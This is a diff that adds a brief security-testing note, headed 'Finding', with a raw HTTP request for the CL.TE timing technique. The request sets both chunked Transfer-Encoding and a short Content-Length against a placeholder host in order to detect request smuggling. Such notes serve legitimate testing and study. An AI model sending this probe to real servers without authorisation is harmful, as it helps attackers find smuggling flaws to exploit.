@@ -1,0 +1,12 @@
+## Finding
+Timing Technique (CL.TE)
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+1
+A
+X
+
+
